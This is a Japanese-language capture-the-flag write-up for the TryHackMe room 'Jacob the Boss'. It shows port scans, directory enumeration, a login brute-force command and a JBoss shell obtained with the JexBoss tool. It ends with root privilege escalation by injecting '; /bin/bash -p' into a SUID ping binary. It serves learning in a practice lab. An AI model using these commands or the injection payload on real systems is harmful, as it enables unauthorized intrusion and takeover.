# Jacob the Boss CTF

https://tryhackme.com/room/jacobtheboss

## Enumeration

```shell
TARGET=10.201.113.17
sudo bash -c "echo $TARGET   jacobtheboss.box >> /etc/hosts"
```

### ポートスキャン

```sh
rustscan -a $TARGET

PORT      STATE SERVICE       REASON
22/tcp    open  ssh           syn-ack ttl 60
80/tcp    open  http          syn-ack ttl 60
111/tcp   open  rpcbind       syn-ack ttl 60
1090/tcp  open  ff-fms        syn-ack ttl 60
1098/tcp  open  rmiactivation syn-ack ttl 60
1099/tcp  open  rmiregistry   syn-ack ttl 60
3306/tcp  open  mysql         syn-ack ttl 60
3873/tcp  open  fagordnc      syn-ack ttl 60
4444/tcp  open  krb524        syn-ack ttl 60
4445/tcp  open  upnotifyp     syn-ack ttl 60
4446/tcp  open  n1-fwp        syn-ack ttl 60
4457/tcp  open  prRegister    syn-ack ttl 60
4712/tcp  open  unknown       syn-ack ttl 60
4713/tcp  open  pulseaudio    syn-ack ttl 60
8009/tcp  open  ajp13         syn-ack ttl 60
8080/tcp  open  http-proxy    syn-ack ttl 60
8083/tcp  open  us-srv        syn-ack ttl 60
33842/tcp open  unknown       syn-ack ttl 60
37093/tcp open  unknown       syn-ack ttl 60
51821/tcp open  unknown       syn-ack ttl 60
```

```shell
root@ip-10-201-94-166:~# sudo nmap -sS -sV -p22,80,111,1090,1098,1099,3306,3873,4444,4445,4446,4457,4712,4713,8009,8080,8083,33842,37093,51821 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-08-08 05:58 BST
NSOCK ERROR [164.4100s] mksock_bind_addr(): Bind to 0.0.0.0:53 failed (IOD #27): Address already in use (98)
Nmap scan report for jacobtheboss.box (10.201.113.17)
Host is up (0.00063s latency).

PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 7.4 (protocol 2.0)
80/tcp    open  http         Apache httpd 2.4.6 ((CentOS) PHP/7.3.20)
111/tcp   open  rpcbind      2-4 (RPC #100000)
1090/tcp  open  java-rmi     Java RMI
1098/tcp  open  java-rmi     Java RMI
1099/tcp  open  java-object  Java Object Serialization
3306/tcp  open  mysql        MariaDB (unauthorized)
3873/tcp  open  java-object  Java Object Serialization
4444/tcp  open  java-rmi     Java RMI
4445/tcp  open  java-object  Java Object Serialization
4446/tcp  open  java-object  Java Object Serialization
4457/tcp  open  tandem-print Sharp printer tandem printing
4712/tcp  open  msdtc        Microsoft Distributed Transaction Coordinator (error)
4713/tcp  open  pulseaudio?
8009/tcp  open  ajp13        Apache Jserv (Protocol v1.3)
8080/tcp  open  http         Apache Tomcat/Coyote JSP engine 1.1
8083/tcp  open  http         JBoss service httpd
33842/tcp open  java-rmi     Java RMI
37093/tcp open  unknown
51821/tcp open  unknown
```

いろいろなポートが開いているが、まずは80ポートのブログに集中する。  
dotclear というフレームワークが使われている。

## 80 dotclear

### サブドメイン、VHOST

hostsの指示があったので何かあると思ったが、何も出ない。

```shell
root@ip-10-201-94-166:~# ffuf -u http://jacobtheboss.box -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.jacobtheboss.box' -fs 5214
```

### ディレクトリ列挙

```sh
root@ip-10-201-94-166:~# dirb http://jacobtheboss.box

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Aug  8 06:12:49 2025
URL_BASE: http://jacobtheboss.box/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://jacobtheboss.box/ ----
==> DIRECTORY: http://jacobtheboss.box/admin/                                                           
+ http://jacobtheboss.box/cache (CODE:403|SIZE:207)                                                     
+ http://jacobtheboss.box/cgi-bin/ (CODE:403|SIZE:210)                                                  
+ http://jacobtheboss.box/db (CODE:403|SIZE:204)                                                        
+ http://jacobtheboss.box/inc (CODE:403|SIZE:205)                                                       
+ http://jacobtheboss.box/index.php (CODE:200|SIZE:5214)                                                
+ http://jacobtheboss.box/LICENSE (CODE:200|SIZE:17987)                                                 
+ http://jacobtheboss.box/plugins (CODE:403|SIZE:209)                                                   
==> DIRECTORY: http://jacobtheboss.box/public/                                                          
==> DIRECTORY: http://jacobtheboss.box/themes/                                                          
+ http://jacobtheboss.box/var (CODE:403|SIZE:205)                                                       
                                                                                                        
---- Entering directory: http://jacobtheboss.box/admin/ ----
==> DIRECTORY: http://jacobtheboss.box/admin/images/                                                    
+ http://jacobtheboss.box/admin/index.php (CODE:302|SIZE:0)                                             
==> DIRECTORY: http://jacobtheboss.box/admin/install/                                                   
==> DIRECTORY: http://jacobtheboss.box/admin/js/                                                        
==> DIRECTORY: http://jacobtheboss.box/admin/style/                                                     
+ http://jacobtheboss.box/admin/xmlrpc.php (CODE:412|SIZE:16)                                           
                                                                                                        
---- Entering directory: http://jacobtheboss.box/public/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                        
---- Entering directory: http://jacobtheboss.box/themes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                        
---- Entering directory: http://jacobtheboss.box/admin/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                        
---- Entering directory: http://jacobtheboss.box/admin/install/ ----
+ http://jacobtheboss.box/admin/install/index.php (CODE:200|SIZE:1497)                                  
                                                                                                        
---- Entering directory: http://jacobtheboss.box/admin/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                        
---- Entering directory: http://jacobtheboss.box/admin/style/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Fri Aug  8 06:12:57 2025
DOWNLOADED: 13836 - FOUND: 11
```

/public は空

/CHANGELOG

```
Dotclear 2.16.9 - 2020-06-02
===========================================================
* Fix: Check password for export only if necessary
* Fix: Cope with mod_access_compat plugin inactive with Apache 2.4+
* Fix: Fix very large font size value (user prefs) with CKEditor
```

jacob でパスワードブルートフォースしたが不発。

```sh
ffuf -u http://jacobtheboss.box/admin/auth.php -c -w /usr/share/wordlists/SecLists/Passwords/xato-net-10-million-passwords-100.txt -X POST -d 'user_id=jacob&user_pwd=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fr 'Wrong username or password'
```

分からないので8080を見る。

## 8080 JBoss

バージョン不明なので、JBossのエクスプロイトを漠然と探す。

https://github.com/joaomatosf/jexboss

```sh
git clone https://github.com/joaomatosf/jexboss.git
cd jexboss
pip install -r requires.txt
python jexboss.py -host http://jacobtheboss.box:8080
```

シェルを取れた。

```sh
Shell> id
 Failed to check for updates
uid=1001(jacob) gid=1001(jacob) groups=1001(jacob) context=system_u:system_r:initrc_t:s0
```

## 権限昇格

mysqlにrootユーザー、パスワードなしでログインできた。パスワードハッシュが入っているが、bcryptでクラックできなかった。

```sh
MariaDB [dotclear]> select * from dc_user;
+---------+------------+-------------+--------------------------------------------------------------+-----------------+------------------+-----------+----------------+------------------+-------------------+----------+-----------+-------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-----------+---------------+------------------+---------------------+---------------------+
| user_id | user_super | user_status | user_pwd                                                     | user_change_pwd | user_recover_key | user_name | user_firstname | user_displayname | user_email        | user_url | user_desc | user_default_blog | user_options                                                                                                                                                                                    | user_lang | user_tz       | user_post_status | user_creadt         | user_upddt          |
+---------+------------+-------------+--------------------------------------------------------------+-----------------+------------------+-----------+----------------+------------------+-------------------+----------+-----------+-------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-----------+---------------+------------------+---------------------+---------------------+
| jacob   |          1 |           1 | $2y$10$tICrvcvuwEQTwGhiT9F.6elbty1McHou9pFTFZTQL3oMqbPihr5YG |               0 | NULL             | the Boss  | Jacob          | NULL             | jacob@theboss.box | NULL     | NULL      | NULL              | a:5:{s:9:"edit_size";i:24;s:14:"enable_wysiwyg";b:1;s:14:"toolbar_bottom";b:0;s:6:"editor";a:2:{s:5:"xhtml";s:10:"dcCKEditor";s:4:"wiki";s:14:"dcLegacyEditor";}s:11:"post_format";s:4:"wiki";} | pt        | Europe/London |               -2 | 2020-07-31 09:38:35 | 2020-07-31 09:38:35 |
+---------+------------+-------------+--------------------------------------------------------------+-----------------+------------------+-----------+----------------+------------------+-------------------+----------+-----------+-------------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-----------+---------------+------------------+---------------------+---------------------+
```

全く分からなくてウォークスルーを見た。

SUIDが付いている、`/usr/bin/pingsys` に注目。言われてみれば少し目立つが、見落としていた。

```sh
[jacob@jacobtheboss tmp]$ find / -perm -u=s -type f -ls 2>/dev/null
5081453   12 -rwsr-xr-x   1 root     root         8536 Jul 30  2020 /usr/bin/pingsys
100759947   32 -rwsr-xr-x   1 root     root        32096 Oct 30  2018 /usr/bin/fusermount
100737943   80 -rwsr-xr-x   1 root     root        78408 Aug  9  2019 /usr/bin/gpasswd
100795659   32 -rwsr-xr-x   1 root     root        32128 Apr  1  2020 /usr/bin/su
100788823   24 -rws--x--x   1 root     root        23968 Apr  1  2020 /usr/bin/chfn
100737946   44 -rwsr-xr-x   1 root     root        41936 Aug  9  2019 /usr/bin/newgrp
100778623   24 -rws--x--x   1 root     root        23880 Apr  1  2020 /usr/bin/chsh
100907751  144 ---s--x--x   1 root     root       147336 Apr  1  2020 /usr/bin/sudo
100795644   44 -rwsr-xr-x   1 root     root        44264 Apr  1  2020 /usr/bin/mount
100737942   76 -rwsr-xr-x   1 root     root        73888 Aug  9  2019 /usr/bin/chage
100795664   32 -rwsr-xr-x   1 root     root        31984 Apr  1  2020 /usr/bin/umount
100887380   60 -rwsr-xr-x   1 root     root        57656 Aug  8  2019 /usr/bin/crontab
100868188   24 -rwsr-xr-x   1 root     root        23576 Apr  1  2020 /usr/bin/pkexec
100759930   28 -rwsr-xr-x   1 root     root        27856 Apr  1  2020 /usr/bin/passwd
 20717   12 -rwsr-xr-x   1 root     root        11232 Apr  1  2020 /usr/sbin/pam_timestamp_check
 20719   36 -rwsr-xr-x   1 root     root        36272 Apr  1  2020 /usr/sbin/unix_chkpwd
217887   12 -rwsr-xr-x   1 root     root        11296 Apr  1  2020 /usr/sbin/usernetctl
346906  116 -rwsr-xr-x   1 root     root       117432 Apr  1  2020 /usr/sbin/mount.nfs
100801794   16 -rwsr-xr-x   1 root     root        15432 Apr  1  2020 /usr/lib/polkit-1/polkit-agent-helper-1
100801792   60 -rwsr-x---   1 root     dbus        57936 Jul 13  2020 /usr/libexec/dbus-1/dbus-daemon-launch-helper
You have new mail in /var/mail/jacob
```

これが、コマンドインジェクションの脆弱性を持つように[独自にコンパイル](https://security.stackexchange.com/questions/196577/privilege-escalation-c-functions-setuid0-with-system-not-working-in-linux)したバイナリらしい。  
たぶん、リバースしたら同じコードになるのだと思われる。

```sh
[jacob@jacobtheboss tmp]$ pingsys '127.0.0.1; /bin/bash -p'
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.018 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.034 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.036 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.035 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 2999ms
rtt min/avg/max/mdev = 0.018/0.030/0.036/0.010 ms
[root@jacobtheboss tmp]# id
uid=0(root) gid=1001(jacob) groups=1001(jacob) context=system_u:system_r:initrc_t:s0
```

## 振り返り

- JBossは、JexBossというツールがあるのだということは覚えておきたい。
- 権限昇格の敗因は、pingsysという見慣れないバイナリを見落としたこと。crontabに気を取られた。通常、crontabはSGIDが付いていてSUIDは付いていないので、見慣れないバイナリとして気を取られてしまったと思われる。

```sh
$ ls -al `which crontab`                                                          
-rwxr-sr-x 1 root crontab 51936 Feb  6  2025 /usr/bin/crontab
```
